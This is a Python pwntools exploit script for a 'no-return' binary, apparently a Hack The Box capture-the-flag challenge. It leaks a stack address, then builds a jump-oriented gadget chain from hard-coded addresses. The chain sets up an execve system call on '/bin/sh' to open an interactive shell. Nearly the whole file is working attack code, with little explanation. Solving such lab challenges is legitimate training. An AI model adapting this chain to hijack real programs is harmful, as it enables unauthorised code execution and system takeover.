from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
                       terminal=["tmux", "split-window", "-v", "-p 85"],)
def attach(r):
    if 1 == 1:
        bkps = ['* 0x401000']
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return


#p = process("./no-return")
xchgrdx_rax = p64(0x40105a)
exchangerdi_rcx = p64(0x401068) #rdi + 1
jmp_rdx = p64(0x401058)
syscall = p64(0x401082)
popgadgets=p64(0x401000)#poprsp;rdi;rsi;rbp;rdx;rcx;rbx;xorrax;jmprdi+1
subrsi_jmpedx = p64(0x401014)
dispatcher = p64(0x40103c)
poprdx_jmpecx = p64(0x401050)
offset = 176
'''
   0x401000:	pop    rsp -> stack_addr
   0x401001:	pop    rdi -> exchangerdi_rcx
   0x401002:	pop    rsi -> 0
   0x401003:	pop    rbp -> 0
   0x401004:	pop    rdx -> p64(0x401022) lea rcx
   0x401005:	pop    rcx -> stack_addr + 28
   0x401006:	pop    rbx -> 0
   0x401007:	xor    rax,rax
   0x40100a:	jmp    QWORD PTR [rdi+0x1]
   0x40100d:	inc    rax
   0x401010:	fdivrp st(1),st
   0x401012:	jmp    QWORD PTR [rdx]

'''
#attach(p)
d = open("dump","w")
#raw_input("Continue?")
p = process("./no-return")
#attach(p)
#p = remote("docker.hackthebox.eu",31973)
raw_input("continue?")
stack = p.recv(8)
stack_addr = (hex(u64(stack)))
stack = int(stack_addr,16) - 184
print(stack_addr)
#p.sendline("BBBBBBB"* 100)
#stack_addr= p64(0x7fffffffe088)
'''
Buffer = bytearray(b"A" * 176)
Buffer += popgadgets + stack
Buffer[:8]    = exchangerdi_rcx
Buffer[8:17]  = p64(0) #rsi
Buffer[17:25] = p64(0) #rbp
buffer[25:33] = p64(stack + x) # rdx
'''

Buffer = p64(stack + 47) #rdi      8 
Buffer += p64(0) #rsi             16
Buffer += p64(stack + 65 + 0x41 - 8 + 31)  #rbp         24
Buffer += p64(stack + 64) #rdx         32 
Buffer += p64(stack + 56) #rcx         40 
Buffer += p64(8) #rbx            48
Buffer += dispatcher # stack address rdi points at 56
Buffer += "/bin/sh\x00" #     64
Buffer += dispatcher
Buffer += p64(59)
Buffer += p64(0x3b3b3b3b3b3b3b3b)
Buffer += p64(0)
Buffer += "AAAA" * 2
Buffer += p64(0x401067)#xchg rdi rcx     72
Buffer += p64(0x40104d) # mov rcx, rdx pop rdx jmp [rcx]
Buffer += poprdx_jmpecx
Buffer += poprdx_jmpecx
Buffer += poprdx_jmpecx
Buffer += p64(0x40105a)
Buffer += syscall
Buffer += "A" * (offset - len(Buffer)) 
Buffer += popgadgets + p64(stack)
p.send(Buffer)
p.interactive()
d.write(Buffer)
d.close()
